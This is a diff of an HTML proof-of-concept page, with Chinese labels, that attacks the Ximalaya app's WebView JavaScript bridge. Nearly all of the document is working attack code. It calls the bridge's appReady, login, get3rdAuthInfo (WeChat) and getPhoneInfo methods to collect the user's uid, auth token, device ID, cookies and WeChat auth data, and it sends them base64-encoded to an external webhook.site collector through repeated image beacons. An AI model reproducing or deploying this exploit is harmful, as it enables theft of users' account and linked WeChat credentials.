@@ -7,64 +7,46 @@
  .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px;margin:10px 0}
  .card h4{margin:0 0 8px 0;color:#7ee787;font-size:13px;font-weight:normal}
  .row{margin:4px 0;line-height:1.5;word-break:break-all}
- .k{color:#8b949e}
- .v{color:#c9d1d9}
- .hl{color:#f2cc60}
- .ok{color:#3fb950}
- .chip{display:inline-block;background:#21262d;border:1px solid #30363d;border-radius:4px;
-       padding:1px 6px;margin:2px;color:#79c0ff;font-size:12px}
+ .k{color:#8b949e}.v{color:#c9d1d9}.hl{color:#f2cc60}.ok{color:#3fb950}.red{color:#f85149}
  #wb a{color:#58a6ff}
 </style></head>
 <body>
-<h3>[PoC] Ximalaya WebView JSBridge - XM-POC-V7</h3>
-<div class="card" id="wb"><h4>收集端地址（电脑浏览器打开查看全部数据）</h4></div>
-<div class="card"><h4>① 身份凭证（jscall.appReady）</h4><div id="cred" class="row"><span class="k">读取中...</span></div></div>
-<div class="card"><h4>② 设备信息</h4><div id="dev" class="row"></div></div>
-<div class="card"><h4>③ JS桥方法（<span id="cnt">-</span>）</h4><div id="br"></div></div>
-<div class="card"><h4>④ 外带状态</h4><div id="st" class="row"><span class="k">发送中...</span></div></div>
+<h3>[PoC] Ximalaya WebView JSBridge - XM-POC-V8-WX</h3>
+<div class="card" id="wb"><h4>收集端地址</h4></div>
+<div class="card"><h4>① appReady（同步取token）</h4><div class="row" id="cred"><span class="k">读取中...</span></div></div>
+<div class="card"><h4>② login桥（异步回调）</h4><div class="row" id="lg"><span class="k">等待回调...</span></div></div>
+<div class="card"><h4>③ get3rdAuthInfo(weixin)</h4><div class="row" id="wx"><span class="k">等待回调...</span></div></div>
+<div class="card"><h4>④ getPhoneInfo</h4><div class="row" id="ph"></div></div>
+<div class="card"><h4>⑤ 外带状态</h4><div class="row" id="st"><span class="k">发送中...</span></div></div>
 <script>
 function b64(s){return btoa(unescape(encodeURIComponent(s)));}
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
-function row(k,v){return '<div class="row"><span class="k">'+k+': </span><span class="v">'+esc(v)+'</span></div>';}
-function rowh(k,html){return '<div class="row"><span class="k">'+k+': </span><span class="v">'+html+'</span></div>';}
-var WH='aa2934cb-9257-4568-afde-7ad359ab5201';
+function norm(d){try{return (typeof d==='string')?decodeURIComponent(d):JSON.stringify(d);}catch(e){return String(d);}}
+var WH='5f2d3f7d-943e-4e9e-bdd7-8fffa0e8cddd';
 var wburl='https://webhook.site/#/'+WH;
-document.getElementById('wb').innerHTML+='<div class="row"><a href="'+wburl+'">'+wburl+'</a></div>';
-
-var ar={},pi='',cookie='',bridges={};
+document.getElementById('wb').innerHTML='<div class="row"><a href="'+wburl+'">'+wburl+'</a></div>';
+var got={login:null,wx:null};
+var ar={},pi='';
 try{ar=JSON.parse(jscall.appReady());}catch(e){ar={err:''+e};}
 try{pi=String(jscall.getPhoneInfo());}catch(e){pi='ERR:'+e;}
-try{cookie=document.cookie;}catch(e){cookie='ERR:'+e;}
-function names(o){try{var m=[],p=o;while(p&&p!==Object.prototype){
-  m=m.concat(Object.getOwnPropertyNames(p));p=Object.getPrototypeOf(p);}return m;}
-  catch(e){return ['ERR:'+e];}}
-['jscall','xmJsBridge','midong'].forEach(function(n){bridges[n]=window[n]?names(window[n]):null;});
-
-var c=document.getElementById('cred');
-if(ar.err){c.innerHTML=row('appReady错误',ar.err);}
-else{
- var tk=String(ar.token||'');
- c.innerHTML=
-  row('uid',ar.uid)+
-  rowh('token','<span class="hl">'+esc(tk.slice(0,24))+'...['+tk.length+'字符，完整见收集端]</span>')+
-  row('deviceId',ar.deviceId)+
-  row('版本',ar.version)+
-  row('系统',ar.platformVersion);
-}
-document.getElementById('dev').innerHTML=
- row('UA',navigator.userAgent)+
- row('cookie',cookie||'(空)')+
- row('phoneinfo',pi);
-var b=document.getElementById('br'),total=0;
-for(var n in bridges){var list=bridges[n]||[];
- total+=list.length;
- b.innerHTML+='<div class="row"><span class="k">'+n+'('+list.length+'):</span></div>';
- list.forEach(function(m){b.innerHTML+='<span class="chip">'+esc(m)+'</span>';});
-}
-document.getElementById('cnt').textContent='共'+total+'个';
-
-var rep={src:'poc-v7',url:location.href,ua:navigator.userAgent,cookie:cookie,
-         bridge:bridges,phoneinfo:pi,appready:JSON.stringify(ar)};
-new Image().src='https://webhook.site/'+WH+'?tag=report&d='+b64(JSON.stringify(rep));
-document.getElementById('st').innerHTML='<span class="ok">[√] 已外带至 webhook.site（'+WH+'）</span>';
+var tk=String(ar.token||'');
+document.getElementById('cred').innerHTML=
+ 'uid: '+esc(ar.uid||'(空))')+'<br>token长度: <span class="hl">'+tk.length+'</span><br>'+
+ (tk?'token前缀: '+esc(tk.slice(0,24)):'<span class="red">token为空（新登录态下fakeToken未铸造）</span>')+
+ '<br>deviceId: '+esc(ar.deviceId||'')+'<br>版本: '+esc(ar.version||'')+' / '+esc(ar.platformVersion||'');
+document.getElementById('ph').textContent=pi;
+window.xmcbLogin=function(d){got.login=norm(d);
+ document.getElementById('lg').textContent=got.login.slice(0,600); send();};
+window.xmcbWx=function(d){got.wx=norm(d);
+ document.getElementById('wx').textContent=String(got.wx).slice(0,400); send();};
+try{jscall.login('xmcbLogin');}catch(e){document.getElementById('lg').textContent='ERR:'+e;}
+try{jscall.get3rdAuthInfo('xmcbWx','{"type":"weixin"}');}catch(e){document.getElementById('wx').textContent='ERR:'+e;}
+var rep1={src:'poc-v8-wx',phase:'sync',url:location.href,ua:navigator.userAgent,cookie:document.cookie,
+          appready:JSON.stringify(ar),phoneinfo:pi,bridge_jscount:(function(){try{return String(Object.getOwnPropertyNames(Object.getPrototypeOf(window.jscall)).length);}catch(e){return '?';}})()};
+function send(){var r={src:'poc-v8-wx',phase:'with-callbacks',url:location.href,appready:JSON.stringify(ar),
+ phoneinfo:pi,login_cb:got.login,wx_cb:got.wx};
+ new Image().src='https://webhook.site/'+WH+'?tag=v8cb&d='+b64(JSON.stringify(r));
+ document.getElementById('st').innerHTML='<span class="ok">[√] 已外带（含回调数据）</span>';}
+new Image().src='https://webhook.site/'+WH+'?tag=v8init&d='+b64(JSON.stringify(rep1));
+setTimeout(send,6000);setTimeout(send,12000);
 </script></body></html>
